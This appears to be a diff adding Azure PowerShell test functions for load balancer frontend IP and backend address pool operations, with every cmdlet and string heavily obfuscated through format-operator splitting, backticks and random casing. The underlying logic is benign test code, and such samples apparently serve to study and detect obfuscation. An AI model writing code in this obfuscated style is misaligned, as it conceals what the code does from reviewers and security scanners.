+        ${rEs`o`U`RCeGR`oUP} = &("{5}{0}{4}{3}{2}{1}" -f 'AzReso','roup','G','e','urc','New-') -Name ${Rg`NAMe} -Location ${Rg`lOCa`TI`oN};
+
+        
+        ${sU`Bn`et} = &("{8}{3}{7}{4}{0}{1}{2}{5}{6}" -f 'l','Net','work','zV','ua','Subn','etConfig','irt','New-A') -Name ${s`U`Bnetna`Me} -AddressPrefix ${Su`BN`etAdd`REsspr`e`FIx};
+        ${vIR`TUaL`NE`TwORK} = &("{1}{3}{0}{2}" -f'tualNe','Ne','twork','w-AzVir') -ResourceGroupName ${rgnA`me} -Location ${lOC`AT`iON} -Name ${v`i`RTu`AlnEtworknAME} -Subnet ${S`UB`Net} -AddressPrefix ${v`IR`Tua`l`NeTWOrKA`dD`REssPRe`Fix};
+        if(-not ${S`UB`NEt}."Id")
+        {
+            ${S`U`Bnet} = &("{3}{2}{1}{6}{4}{7}{0}{5}"-f 'u','i','t-AzV','Ge','twork','bnetConfig','rtualNe','S') -Name ${s`Ubn`ETNaMe} -VirtualNetwork ${vi`RtuaL`NetWorK};
+        }
+
+        
+        ${V`FR`ON`TE`NdiPC`oN`FiGur`AtiOn} = &("{5}{7}{3}{1}{6}{4}{0}{2}"-f 'end','AzLoadB','IpConfig','-','ncerFront','Ne','ala','w') -Name ${R`NA`Me} -Subnet ${subn`Et};
+        &("{1}{3}{2}{0}"-f 'll','Asser','tNu','t-No') ${v`FRo`N`TenDipcOn`F`iGu`RaTIon};
+        &("{3}{0}{2}{1}" -f 't-Tr','e','u','Asser') { &("{1}{2}{3}{0}"-f 'mdletReturnType','Ch','ec','k-C') ("{4}{0}{5}{2}{1}{3}" -f 'e','nten','dBalancerFro','dIpConfig','N','w-AzLoa') ${VfrO`N`TenDIp`cONFigura`TI`oN} };
+        ${VLoA`d`Balan`c`er} = &("{1}{4}{2}{3}{0}"-f 'er','New','L','oadBalanc','-Az') -ResourceGroupName ${RGNa`me} -Name ${r`N`AMe} -FrontendIPConfiguration ${Vf`RoNt`eNDip`CONF`IgUraT`ion} -Location ${LocA`TI`oN};
+        &("{3}{2}{0}{1}" -f'Nu','ll','sert-Not','As') ${V`loaD`Bal`A`Ncer};
+        &("{2}{3}{4}{0}{1}" -f'u','al','Ass','ert','-AreEq') ${r`Na`Me} ${vFrOnTE`ND`ipcOnfi`gu`Rat`ION}."N`AME";
+
+        
+        ${VfROntE`NDIPcoNfI`G`U`RaT`ioN} = &("{2}{3}{8}{4}{5}{7}{1}{6}{0}"-f 'IpConfig','rFron','Get-','AzLo','dBala','nc','tend','e','a') -LoadBalancer ${VLOa`DB`Alan`CeR} -Name ${r`NaME};
+        &("{2}{3}{1}{0}" -f 'll','u','Assert','-NotN') ${v`FRo`NTen`DI`PConf`IGuR`ATiOn};
+        &("{2}{0}{1}" -f 's','ert-True','As') { &("{0}{3}{2}{4}{1}"-f'Check-Cm','ype','Retu','dlet','rnT') ("{0}{1}{5}{2}{4}{3}" -f'Ge','t-','LoadBalancerFrontend','onfig','IpC','Az') ${VfRON`Ten`d`iPcoNFIg`U`RaTIoN} };
+        &("{2}{0}{1}{3}"-f 'ssert-Ar','eEqu','A','al') ${R`Name} ${vfroNt`eN`DIpcOnfI`Gu`RAtioN}."n`AmE";
+
+        
+        ${lIs`TFr`ONTE`N`dIPcOnF`IGuRaTI`On} = &("{5}{0}{7}{4}{2}{3}{6}{1}"-f '-Az','pConfig','ncerF','ronte','adBala','Get','ndI','Lo') -LoadBalancer ${vLO`A`Db`ALANCEr};
+        &("{1}{0}{2}{3}{4}" -f'ser','As','t','-NotNul','l') (${lIsTFr`OnTEnDipcO`NF`i`G`U`RA`T`IoN} | &("{0}{2}{1}" -f'W','ject','here-Ob') { ${_}."nA`me" -eq ${r`NAme} });
+
+        
+        ${vlo`AdBal`ANCer} = &("{2}{8}{0}{5}{10}{4}{6}{3}{7}{1}{9}" -f 'a','end','Set-AzL','o','lanc','dB','erFr','nt','o','IpConfig','a') -Name ${r`N`AmE} -LoadBalancer ${v`L`oA`DbALAncer} -Subnet ${S`U`BneT};
+        &("{2}{3}{1}{4}{0}"-f 'ull','-No','Asser','t','tN') ${vL`o`A`DbalANCEr};
+        ${vL`OaD`Ba`lAncER} = &("{0}{3}{2}{1}"-f'S','dBalancer','zLoa','et-A') -LoadBalancer ${VloAd`B`A`LaNC`ER};
+        &("{3}{2}{1}{0}" -f'tNull','o','t-N','Asser') ${VLOA`dBA`l`ANc`Er};
+
+        
+        ${VF`Ro`NtENDipcO`NFIgu`RAtioN} = &("{6}{0}{8}{1}{4}{2}{5}{9}{7}{3}"-f '-','zL','Balance','g','oad','rFro','Get','fi','A','ntendIpCon') -LoadBalancer ${VL`oA`d`BalancEr} -Name ${R`N`Ame};
+        &("{3}{1}{2}{0}" -f'l','ssert-NotN','ul','A') ${Vfr`OnteN`DIpCON`FIGurA`TIon};
+        &("{1}{0}{3}{2}"-f'sert-','As','ue','Tr') { &("{4}{1}{0}{3}{2}"-f'k-Cm','c','e','dletReturnTyp','Che') ("{0}{7}{2}{4}{8}{1}{6}{9}{5}{10}{3}" -f 'G','ance','t-Az','ig','Loa','end','rFr','e','dBal','ont','IpConf') ${v`FrONT`ENDI`pc`onfIGUrATIOn} };
+        &("{0}{3}{1}{2}{4}"-f'As','ert','-AreEqua','s','l') ${rnA`ME} ${VFRont`End`ip`cO`NFig`UR`ATIoN}."Na`mE";
+
+        
+        ${LiS`TFROnte`NdI`PC`ONF`IGu`Ra`TION} = &("{5}{1}{2}{0}{4}{3}"-f 'ancerFron','zL','oadBal','onfig','tendIpC','Get-A') -LoadBalancer ${vL`O`AdBAlAnCER};
+        &("{2}{3}{0}{1}" -f 'ert-Not','Null','As','s') (${lisTFR`On`Ten`dIpCONf`i`guRATI`oN} | &("{2}{1}{0}" -f'ject','b','Where-O') { ${_}."nA`Me" -eq ${rnA`mE} });
+
+        
+        ${vl`o`ADBalAnCEr} = &("{2}{5}{1}{0}{3}{4}" -f'ronte','F','Add-','ndIpC','onfig','AzLoadBalancer') -Name ${RN`AM`E`ADd} -LoadBalancer ${vlOadBAla`N`ceR} -Subnet ${s`UBnet};
+        &("{3}{1}{2}{0}{4}"-f'NotNul','se','rt-','As','l') ${vL`OA`dbA`LaN`cER};
+        ${v`LoadbA`lA`N`CER} = &("{3}{1}{2}{4}{0}"-f 'r','e','t-AzLoadBa','S','lance') -LoadBalancer ${vLOADbalaN`C`ER};
+        &("{1}{3}{0}{2}"-f'Not','Asse','Null','rt-') ${vLO`AdBAlan`c`Er};
+
+        
+        ${VFR`oNTEn`dIP`CO`N`Fi`Gu`RATioN} = &("{4}{3}{2}{6}{1}{0}{8}{7}{5}" -f 'nten','ncerFro','a','et-AzLo','G','fig','dBala','on','dIpC') -LoadBalancer ${VL`O`ADbalanC`er} -Name ${RNa`MEaDD};
+        &("{1}{3}{0}{2}"-f 'Nul','Assert','l','-Not') ${vF`ROnTenDipco`N`FiGUR`ATI`oN};
+        &("{2}{3}{1}{0}" -f 'ue','-Tr','Asse','rt') { &("{2}{4}{3}{5}{6}{0}{1}"-f'r','nType','C','k-Cmd','hec','l','etRetu') ("{0}{6}{4}{2}{3}{5}{1}" -f 'Get','Config','dBalan','cerFro','oa','ntendIp','-AzL') ${vf`RoNt`e`N`DI`PCON`FIgurATION} };
+        &("{3}{1}{0}{2}"-f 't-Are','ser','Equal','As') ${r`NAm`EadD} ${V`FrontE`ND`iPC`O`NfIgURAtIon}."NA`ME";
+
+        
+        ${l`I`stf`RONt`endIPcO`NfiguRAtIon} = &("{1}{2}{6}{4}{5}{0}{7}{3}" -f'n','Get-Az','L','nfig','t','e','oadBalancerFron','dIpCo') -LoadBalancer ${v`LOad`BaLAN`CER};
+        &("{2}{0}{1}{3}"-f 'sse','r','A','t-NotNull') (${LiSTfrONtEn`DiP`coNf`IG`UR`AtION} | &("{3}{2}{0}{1}"-f 'jec','t','Ob','Where-') { ${_}."Na`me" -eq ${RNaM`E`Add} });
+
+        
+        &("{0}{4}{5}{3}{1}{2}" -f 'A','nta','ins','hrowsCo','ssert','-T') { &("{5}{0}{4}{1}{3}{2}"-f'd-AzLoa','alancerF','pConfig','rontendI','dB','Ad') -Name ${rN`Am`eAdd} -LoadBalancer ${VLO`AdbaL`A`N`Cer} -Subnet ${su`BnET} } ("{2}{1}{0}" -f 'ts','is','already ex');
+
+        
+        ${vLOAdB`AlaNC`ER} = &("{6}{2}{5}{7}{4}{1}{3}{0}"-f'nfig','nd','ove','IpCo','rFronte','-AzLoadB','Rem','alance') -LoadBalancer ${VLo`AD`Balan`cER} -Name ${R`N`AMEAdd};
+        ${v`LoA`d`Ba`LaNcEr} = &("{0}{2}{1}{3}" -f 'S','t-AzLoadBa','e','lancer') -LoadBalancer ${vlo`A`D`Ba`Lancer};
+        &("{1}{2}{0}"-f 'll','Assert-N','otNu') ${vloAdb`ALAN`c`Er};
+
+        
+        &("{1}{0}{3}{2}"-f'Thr','Assert-','s','owsContain') { &("{3}{2}{7}{6}{9}{1}{4}{0}{8}{5}" -f 'pC','o','-Az','Get','ntendI','ig','dBa','Loa','onf','lancerFr') -LoadBalancer ${vL`OadB`AlANc`Er} -Name ${rn`AM`EADD} } ("{0}{7}{6}{1}{10}{3}{8}{4}{2}{9}{5}" -f 'Sequenc','ntai','l','matchi','e','t','co','e ','ng ','emen','ns no ');
+
+        
+        &("{3}{2}{1}{4}{0}{5}"-f'a','rt-ThrowsC','se','As','ont','ins') { &("{4}{5}{3}{0}{6}{1}{2}" -f'a','onte','ndIpConfig','t-AzLoadBal','S','e','ncerFr') -Name ${r`NAm`eADD} -LoadBalancer ${VlOaDBA`l`A`NceR} -Subnet ${SuB`Net} } ("{1}{3}{0}{2}" -f 'ot','does',' exist',' n');
+    }
+    finally
+    {
+        
+        &("{0}{2}{3}{5}{4}{1}"-f'Cle','up','an','-Resou','Gro','rce') ${RGN`A`ME};
+    }
+}
+
+
+function tes`T-FR`oNtEnD`iP`co`N`FIGurATiO`NCR`UDa`LlParAmeteRs
+{
+    
+    ${rg`Na`me} = &("{2}{1}{5}{3}{0}{4}"-f 'pN','e','G','-ResourceGrou','ame','t');
+    ${r`GLoC`ATI`oN} = &("{4}{0}{5}{2}{3}{1}{6}"-f'-P','erLocat','o','vid','Get','r','ion') ("{2}{4}{0}{1}{3}" -f'ceMan','age','Reso','ment','ur');
+    ${Rna`ME} = &("{1}{2}{3}{0}" -f'ame','Ge','t-R','esourceN');
+    ${r`Na`m`EadD} = "${rname}Add";
+    ${LOca`T`IoN} = &("{3}{1}{0}{2}" -f'iderLo','rov','cation','Get-P') ("{6}{2}{8}{4}{0}{3}{7}{5}{1}"-f'/l','s','Net','oa','rk','ncer','Microsoft.','dBala','wo') ("{2}{1}{0}" -f' 2','ast US','E');
+    
+    ${prIVat`eipaD`Dre`SS} = ("{0}{2}{1}" -f'1','.1.13','0.0');
+    
+    ${Priv`AteipaddR`EsS`Set} = ("{0}{2}{1}"-f'10','.1.16','.0');
+    
+    ${S`UbN`ETnA`mE} = ("{2}{1}{0}"-f'e','m','SubnetNa');
+    ${S`UBNetA`d`drE`S`SPrEF`Ix} = ("{0}{1}{2}"-f'1','0.0.1.0/','24');
+    ${virtuAlN`EtWO`Rk`NaMe} = ("{1}{2}{0}{4}{5}{3}"-f'tualNetw','V','ir','e','orkNa','m');
+    ${Vi`RTuAln`Et`wOrKadD`Re`sSp`ReFIx} = @(("{2}{0}{1}"-f '0.','0.0/8','10.'));
+
+    try
+    {
+        ${RE`soU`RCEgRo`Up} = &("{5}{3}{0}{2}{4}{1}"-f'Resour','oup','ceG','Az','r','New-') -Name ${RG`Na`mE} -Location ${r`Gloc`A`TIoN};
+
+        
+        ${SUB`NeT} = &("{3}{6}{4}{2}{0}{7}{1}{5}" -f 't','nf','e','New-AzV','ualNetworkSubn','ig','irt','Co') -Name ${su`B`NEtNAmE} -AddressPrefix ${sU`BN`eTAdDRe`sS`P`REfIX};
+        ${VIrTU`ALNe`TW`O`RK} = &("{2}{3}{0}{4}{1}"-f'tw','rk','New-AzVirtual','Ne','o') -ResourceGroupName ${r`GNaME} -Location ${loCA`TI`on} -Name ${VIrtu`AL`Ne`TWOrKNA`ME} -Subnet ${Su`Bnet} -AddressPrefix ${VIrT`U`Al`N`EtWoRkADD`ReS`spRE`FiX};
+        if(-not ${sub`Net}."Id")
+        {
+            ${SubN`et} = &("{0}{5}{6}{8}{1}{4}{2}{3}{7}" -f'G','alNetwo','et','Con','rkSubn','e','t-Az','fig','Virtu') -Name ${sU`BNeT`NA`me} -VirtualNetwork ${V`IrTUalN`E`TwoRk};
+        }
+
+        
+        ${V`FR`o`N`TEnDiPco`NFIGURATI`on} = &("{6}{7}{2}{5}{3}{10}{9}{4}{0}{8}{1}" -f 'ntendI','Config','w-','adB','erFro','AzLo','N','e','p','nc','ala') -Name ${rn`A`mE} -Subnet ${SU`BNet} -PrivateIpAddress ${P`RiV`ATeIPADd`REsS};
+        &("{2}{0}{1}{3}"-f'ss','ert-','A','NotNull') ${vFrOn`TEndipcONF`i`gUR`ATiOn};
+        &("{2}{0}{1}{3}"-f 'er','t-T','Ass','rue') { &("{6}{5}{3}{2}{4}{1}{0}" -f 'ype','nT','etRe','k-Cmdl','tur','hec','C') ("{2}{3}{1}{0}{4}{5}"-f'endIpC','oadBalancerFront','New-Az','L','on','fig') ${VFRoNT`enDip`c`ON`FIguRa`T`IOn} };
+        ${VL`oa`Db`A`LanCER} = &("{3}{5}{2}{0}{4}{1}" -f'n','r','ala','New','ce','-AzLoadB') -ResourceGroupName ${r`GnAMe} -Name ${r`NaMe} -FrontendIPConfiguration ${vf`RonTEN`Di`Pc`On`FiGUrat`ioN} -Location ${L`OcatI`on};
+        &("{2}{4}{1}{0}{3}"-f 'ul','-NotN','Asse','l','rt') ${vL`OAD`Ba`La`Ncer};
+        &("{2}{3}{1}{0}"-f'eEqual','Ar','Assert','-') ${Rn`AME} ${vFroNTeND`ip`co`NF`IG`Ura`TI`oN}."n`AMe";
+        &("{0}{1}{2}"-f'Assert-AreE','qua','l') ${p`RIvATEiP`AdDRE`SS} ${V`F`RoNTEN`dI`P`c`Onfi`GUrAtIOn}."pri`VATE`ipaddr`E`sS";
+
+        
+        ${Vf`Ro`NtENDI`pco`NfigURaTI`ON} = &("{5}{2}{1}{4}{3}{0}"-f'fig','onten','ancerFr','pCon','dI','Get-AzLoadBal') -LoadBalancer ${VLoAD`B`ALANceR} -Name ${rN`A`Me};
+        &("{0}{3}{1}{2}" -f 'Ass','t-','NotNull','er') ${v`Fron`TenDiP`c`onfigU`Ra`TiON};
+        &("{1}{2}{0}"-f'rt-True','Ass','e') { &("{3}{5}{0}{2}{4}{6}{1}"-f'k','ype','-Cmdle','C','tRe','hec','turnT') ("{2}{1}{5}{0}{3}{4}{6}" -f 'dBalance','t-Az','Ge','r','FrontendIp','Loa','Config') ${v`FRoN`TENdIp`cON`F`i`GuRAtION} };
+        &("{0}{2}{4}{1}{3}" -f 'Asse','A','r','reEqual','t-') ${rnA`mE} ${vF`R`o`Nt`EnDipCO`NFiGURat`iON}."nA`mE";
+        &("{0}{3}{2}{1}"-f 'Asse','ual','-AreEq','rt') ${pr`I`VATeipAdDr`eSS} ${VfrON`TeNdiP`CON`FigURat`i`ON}."PR`IVateI`PA`dDresS";
+
+        
+        ${lIstfroNTe`N`d`I`pconFIGUrATIon} = &("{4}{0}{2}{1}{6}{3}{5}{7}{8}"-f'LoadBal','nc','a','ro','Get-Az','nt','erF','end','IpConfig') -LoadBalancer ${VL`O`Adb`ALanC`eR};
+        &("{2}{1}{3}{0}"-f'otNull','t','Asser','-N') (${LISTFro`N`T`ENd`IPCOnFIgU`R`ATiOn} | &("{3}{2}{0}{1}"-f'bjec','t','O','Where-') { ${_}."N`AmE" -eq ${rnA`Me} });
+
+        
+        ${vl`oAd`BALAncEr} = &("{5}{6}{2}{4}{8}{1}{7}{9}{0}{3}"-f 'tendI','r','zLo','pConfig','a','Se','t-A','F','dBalance','ron') -Name ${R`Name} -LoadBalancer ${vlO`AD`BALA`NCEr} -Subnet ${suB`NEt} -PrivateIpAddress ${p`RivatEip`ADD`ReSSSEt};
+        &("{3}{0}{2}{1}" -f 'er','ll','t-NotNu','Ass') ${vL`oadB`A`laNC`Er};
+        ${v`Loa`dbAlAn`ceR} = &("{1}{4}{2}{3}{0}" -f'cer','Set-','zLoadBa','lan','A') -LoadBalancer ${VLoaDBaL`A`N`C`er};
+        &("{2}{4}{1}{0}{3}"-f 'rt-','e','As','NotNull','s') ${vLOaDb`A`lANCER};
+
+        
+        ${VFRoNtEN`d`ip`CONfiGUr`AtIon} = &("{4}{1}{2}{3}{5}{0}" -f 'onfig','et-','AzLoadBalancerFro','n','G','tendIpC') -LoadBalancer ${vLoADB`ALa`N`CER} -Name ${R`N`Ame};
+        &("{2}{3}{0}{1}" -f't-NotNu','ll','Asse','r') ${vfrONTe`N`Di`pcONFiGU`RaTI`oN};
+        &("{2}{0}{1}"-f 'sert-','True','As') { &("{5}{1}{0}{2}{4}{3}"-f'l','k-Cmd','etR','rnType','etu','Chec') ("{3}{1}{8}{6}{0}{9}{4}{7}{5}{2}"-f'cerFr','t-A','fig','Ge','en','on','an','dIpC','zLoadBal','ont') ${VfrO`NTeNDiP`C`oNfIGURA`TiOn} };
+        &("{1}{3}{2}{0}"-f'ual','Asse','-AreEq','rt') ${R`NaME} ${vFro`NtENDIPcO`NfIG`URA`TI`on}."na`ME";
+        &("{2}{1}{4}{0}{3}"-f'Eq','-Ar','Assert','ual','e') ${PriV`AT`EiP`AdDr`ESSS`eT} ${vFRO`NtEN`DI`Pco`NfiG`URA`TIOn}."PRiVaTe`i`pAd`dR`esS";
+
+        
+        ${l`iSTFroN`Te`ND`IPCOn`FIGURa`TIOn} = &("{2}{8}{0}{6}{4}{7}{5}{3}{1}" -f'o','IpConfig','Get-Az','d','dBa','en','a','lancerFront','L') -LoadBalancer ${VlOAd`Ba`L`AncEr};
+        &("{0}{3}{1}{2}" -f 'Ass','Nu','ll','ert-Not') (${lIsTfro`NT`enDIP`c`oNfIguRatIon} | &("{2}{0}{1}{3}" -f 'her','e-Ob','W','ject') { ${_}."N`AME" -eq ${rN`A`ME} });
+
+        
+        ${VL`oaDbALAn`c`er} = &("{6}{2}{5}{3}{1}{4}{7}{0}" -f 'tendIpConfig','an','d','adBal','ce','d-AzLo','A','rFron') -Name ${Rn`AmeadD} -LoadBalancer ${VLOadb`Al`ANcer} -Subnet ${S`UBnet};
+        &("{3}{1}{2}{4}{0}"-f 'l','ser','t-Not','As','Nul') ${vlO`A`Db`Al`ANCeR};
+        ${vLOa`dbA`l`An`CER} = &("{5}{1}{4}{2}{3}{0}"-f 'cer','et','B','alan','-AzLoad','S') -LoadBalancer ${VlO`A`DB`Al`AnceR};
+        &("{0}{4}{2}{1}{3}" -f 'Asse','t','o','Null','rt-N') ${VlOaDbA`lAnc`er};
+
+        
+        ${vfRON`TEND`i`pcOnfIGUr`A`T`ion} = &("{7}{4}{0}{8}{1}{3}{2}{5}{6}"-f '-AzLoadBal','cerFronte','pC','ndI','t','onf','ig','Ge','an') -LoadBalancer ${VLoaDB`A`L`AN`cer} -Name ${rn`AMe`AdD};
+        &("{2}{3}{0}{1}"-f 'l','l','Asser','t-NotNu') ${V`Fr`ONT`E`NdIPcONFI`gUrAtIOn};
+        &("{3}{2}{1}{0}" -f'e','t-Tru','ser','As') { &("{1}{2}{3}{0}{4}" -f'eturn','Chec','k-Cmd','letR','Type') ("{2}{5}{0}{1}{8}{3}{4}{7}{6}" -f 'oadB','a','Get-Az','e','ndIpC','L','g','onfi','lancerFront') ${Vf`RoNTENDIP`C`onf`ig`UR`ATiOn} };
+        &("{4}{3}{1}{0}{2}" -f 'ua','-AreEq','l','ssert','A') ${Rn`A`mEAdD} ${v`F`Ron`T`e`NdiP`cONfiguRa`TiON}."NA`Me";
+
+        
+        ${L`IStFr`o`NTENDI`P`Co`Nfig`UR`AtioN} = &("{5}{4}{9}{0}{3}{2}{8}{6}{1}{7}"-f'Lo','IpC','ance','adBal','A','Get-','Frontend','onfig','r','z') -LoadBalancer ${V`loaD`BALAN`c`eR};
+        &("{2}{0}{1}"-f'sert-NotN','ull','As') (${L`I`s`TfrOnt`e`NDIPcONFigur`AtI`oN} | &("{1}{0}{2}"-f 'ere-','Wh','Object') { ${_}."N`Ame" -eq ${RNAM`E`AdD} });
+
+        
+        &("{1}{4}{2}{0}{3}" -f 'rowsC','As','Th','ontains','sert-') { &("{2}{3}{7}{1}{4}{5}{0}{6}" -f'Co','on','Add-Az','Load','ten','dIp','nfig','BalancerFr') -Name ${RnaM`e`AdD} -LoadBalancer ${V`lo`AD`BaLaNC`ER} -Subnet ${Sub`NeT} } ("{3}{1}{2}{0}"-f 'ists','lready',' ex','a');
+
+        
+        ${v`lOaD`BAL`Anc`eR} = &("{3}{0}{2}{6}{4}{7}{1}{5}{8}" -f've-AzLo','r','ad','Remo','l','FrontendI','Ba','ance','pConfig') -LoadBalancer ${Vl`oAD`BAlA`NCEr} -Name ${RNaM`eA`dD};
+        ${Vl`OADBaLAN`C`eR} = &("{1}{4}{3}{2}{0}{5}" -f 'Bala','Set','oad','L','-Az','ncer') -LoadBalancer ${VLo`A`dBaLanC`ER};
+        &("{0}{3}{2}{1}" -f'Ass','l','l','ert-NotNu') ${vLO`Adb`ALA`NCeR};
+
+        
+        &("{5}{2}{3}{1}{4}{0}" -f 's','ta','sert-Throws','Con','in','As') { &("{4}{2}{1}{5}{0}{6}{3}"-f'Con','rontendI','zLoadBalancerF','g','Get-A','p','fi') -LoadBalancer ${v`loaDBA`lA`N`ceR} -Name ${RNAMEa`Dd} } ("{5}{2}{4}{1}{0}{6}{3}" -f'ntain','o','equenc','no matching element','e c','S','s ');
+
+        
+        &("{2}{3}{0}{4}{1}"-f'ert-Thr','s','As','s','owsContain') { &("{3}{5}{0}{4}{1}{2}"-f'Balanc','onfi','g','Se','erFrontendIpC','t-AzLoad') -Name ${Rn`AM`e`ADD} -LoadBalancer ${vLoad`BA`l`AnCeR} -Subnet ${s`UbNET} -PrivateIpAddress ${p`R`IvA`TEipADD`ReS`SSEt} } ("{0}{3}{1}{2}" -f 'does not ','is','t','ex');
+    }
+    finally
+    {
+        
+        &("{3}{1}{5}{0}{2}{4}" -f'ou','a','rc','Cle','eGroup','n-Res') ${rG`Na`me};
+    }
+}
+
+
+function TesT-B`ACkE`NDAd`dRE`sSpooLcRuDminIm`Al`P`AR`AmeTErS
+{
+    
+    ${rg`NaME} = &("{0}{3}{2}{1}{4}"-f'Get-R','roupN','urceG','eso','ame');
+    ${RG`lO`cA`TIOn} = &("{4}{2}{1}{3}{0}" -f'Location','t-Pro','e','vider','G') ("{1}{3}{2}{0}" -f'nt','Resou','ceManageme','r');
+    ${R`NAme} = &("{1}{2}{0}"-f'e','Ge','t-ResourceNam');
+    ${r`NaM`EaDD} = "${rname}Add";
+    ${L`O`CATion} = &("{5}{3}{4}{0}{1}{2}"-f'rLoca','ti','on','t-','Provide','Ge') ("{2}{1}{0}{5}{3}{4}"-f't.Network','icrosof','M','Ba','lancers','/load');
+    
+    ${P`UBli`ciPadDre`ss`N`A`Me} = ("{0}{4}{3}{2}{5}{1}" -f'P','ssName','PA','blicI','u','ddre');
+    ${PubL`I`cIp`Ad`drESSaLloCa`Ti`oNMet`hod} = ("{0}{1}" -f'St','atic');
+    ${f`ROnTeNDip`cOn`FiGURaT`i`ONnamE} = ("{2}{4}{3}{1}{5}{0}"-f 'gurationName','IPCon','Fro','nd','nte','fi');
+
+    try
+    {
+        ${Reso`URCEgRo`UP} = &("{3}{2}{0}{1}{4}" -f 'eGr','ou','w-AzResourc','Ne','p') -Name ${rgNa`Me} -Location ${rGLOC`A`Tion};
+
+        
+        ${pUBLiCIp`ADdR`Ess} = &("{2}{3}{1}{0}" -f'dress','d','New-AzPublicI','PA') -ResourceGroupName ${R`g`NaME} -Location ${lOC`ATIon} -Name ${Publ`I`CIPa`Dd`REs`sNamE} -AllocationMethod ${PUBl`IC`I`PAd`dRE`SsA`LlOCAt`IOnmE`THOD};
+        ${fr`ontenDIPCo`NFIgU`RAtI`oN} = &("{5}{1}{2}{7}{6}{0}{4}{3}"-f'an','-A','zLoa','ndIpConfig','cerFronte','New','l','dBa') -Name ${FRonTeND`IpcO`NfiG`UrATi`OnnaME} -PublicIpAddress ${Pu`B`LIcIPadD`Re`ss};
+
+        
+        ${vb`Ac`kendAdDreSsP`OOL} = &("{3}{1}{10}{12}{11}{5}{6}{2}{9}{8}{4}{0}{7}" -f'C','ew-','ndAd','N','l','ack','e','onfig','sPoo','dres','A','BalancerB','zLoad') -Name ${Rn`AMe};
+        &("{0}{1}{3}{2}"-f'Assert-No','t','l','Nul') ${vBacKE`NDaDd`R`ES`sPO`Ol};
+        &("{1}{2}{0}" -f'e','As','sert-Tru') { &("{2}{3}{0}{4}{5}{6}{1}" -f'e','ype','C','h','ck-','CmdletRe','turnT') ("{4}{1}{7}{2}{0}{3}{5}{6}"-f 'ke','w-AzL','lancerBac','ndAddr','Ne','essPoolConf','ig','oadBa') ${vbac`k`en`Da`ddResSPO`Ol} };
+        ${v`L`oaDB`AlANcer} = &("{1}{2}{3}{0}{4}" -f'a','New','-Az','Lo','dBalancer') -ResourceGroupName ${R`gN`AmE} -Name ${R`NAmE} -BackendAddressPool ${Vb`Ac`KENd`AddR`essPOOl} -FrontendIPConfiguration ${frON`TENdiPcon`F`Igu`RaTIoN} -Location ${lO`CaTiON};
+        &("{1}{0}{3}{2}"-f 'sert-NotN','As','ll','u') ${Vl`oaD`Bala`NCEr};
+        &("{1}{0}{2}{3}{4}"-f '-Are','Assert','E','qua','l') ${r`Na`mE} ${Vb`ACkEN`daDDr`Es`sp`O`ol}."NA`Me";
+
+        
+        ${VbAc`KE`N`Da`DDreSsPo`oL} = &("{10}{8}{2}{0}{4}{5}{7}{9}{1}{3}{6}" -f'c','r','AzLoadBalan','essPoo','erB','acken','lConfig','dA','-','dd','Get') -LoadBalancer ${VlOAdB`Al`An`C`er} -Name ${RnA`mE};
+        &("{0}{4}{1}{2}{3}" -f'A','se','rt-No','tNull','s') ${vBAc`KENdad`d`RE`SsPoOL};
+        &("{0}{1}{2}{3}"-f'A','ss','er','t-True') { &("{6}{3}{5}{1}{0}{4}{2}" -f'dl','Cm','turnType','eck','etRe','-','Ch') ("{4}{6}{7}{1}{0}{5}{2}{3}" -f'erBacke','c','d','AddressPoolConfig','G','n','et-A','zLoadBalan') ${v`Ba`cKen`DAd`d`RESSpOOl} };
+        &("{3}{2}{1}{0}"-f'l','ua','q','Assert-AreE') ${rn`A`me} ${vB`AckENDa`ddR`EsS`pooL}."na`ME";
+
+        
+        ${lI`Stbac`kE`NDaDDRe`SSPO`oL} = &("{3}{0}{6}{2}{4}{7}{5}{1}"-f 't-AzLoad','sPoolConfig','cerBac','Ge','ke','dres','Balan','ndAd') -LoadBalancer ${V`LOadBa`lANc`Er};
+        &("{4}{2}{3}{0}{1}" -f 'l','l','rt-Not','Nu','Asse') (${lI`s`TB`AckE`NDadD`REsSpOol} | &("{2}{0}{3}{1}"-f 'bj','ct','Where-O','e') { ${_}."nA`Me" -eq ${r`NAmE} });
+
+        
+        ${VL`oadbaL`ANcER} = &("{12}{10}{2}{8}{5}{7}{11}{6}{1}{0}{3}{9}{4}" -f 'ackendA','rB','-A','d','ressPoolConfig','Load','ce','Bala','z','d','dd','n','A') -Name ${RNa`m`EaDd} -LoadBalancer ${VloA`DbA`L`ANcER};
+        &("{1}{0}{4}{3}{2}"-f'r','Asse','ull','N','t-Not') ${vlO`Ad`BaL`An`cer};
+        ${VLO`A`d`BAlANC`Er} = &("{5}{4}{1}{2}{0}{3}" -f 'n','oadBa','la','cer','zL','Set-A') -LoadBalancer ${vl`oA`DB`ALanceR};
+        &("{0}{2}{1}{3}"-f 'Asser','o','t-N','tNull') ${Vl`OADB`A`LANCeR};
+
+        
+        ${vbACK`enDa`D`D`ResSPoOL} = &("{7}{1}{5}{10}{0}{9}{3}{4}{11}{2}{6}{8}" -f 'Lo','e','ckendAdd','dB','alance','t-A','ressPool','G','Config','a','z','rBa') -LoadBalancer ${vL`oad`BaLaNCeR} -Name ${R`N`AMEADd};
+        &("{0}{2}{3}{1}{4}" -f 'Asse','NotN','rt','-','ull') ${VbackenDADdres`sp`o`OL};
+        &("{1}{3}{0}{2}" -f't-Tru','Ass','e','er') { &("{5}{6}{4}{3}{0}{1}{2}"-f 'et','ur','nType','R','let','Che','ck-Cmd') ("{7}{3}{2}{4}{5}{1}{0}{6}"-f'C','l','acken','ncerB','dAddressPo','o','onfig','Get-AzLoadBala') ${vBAcKeN`DAdDrEs`s`pOOl} };
+        &("{1}{2}{0}"-f'rt-AreEqual','A','sse') ${RnamE`AdD} ${VbACKEnd`ADd`R`E`sS`PoOL}."n`Ame";
+
+        
+        ${LIstBA`CkenD`Addr`esS`pool} = &("{2}{1}{4}{8}{0}{7}{3}{10}{6}{5}{9}"-f'alancer','et-','G','Add','AzLoa','o','lC','Backend','dB','nfig','ressPoo') -LoadBalancer ${v`Loadb`AL`ANcER};
+        &("{1}{4}{2}{0}{3}"-f't-No','Ass','r','tNull','e') (${l`ist`BackE`NDADDRe`Ssp`ooL} | &("{3}{1}{0}{2}"-f '-O','ere','bject','Wh') { ${_}."n`AMe" -eq ${Rna`m`ea`dD} });
+
+        
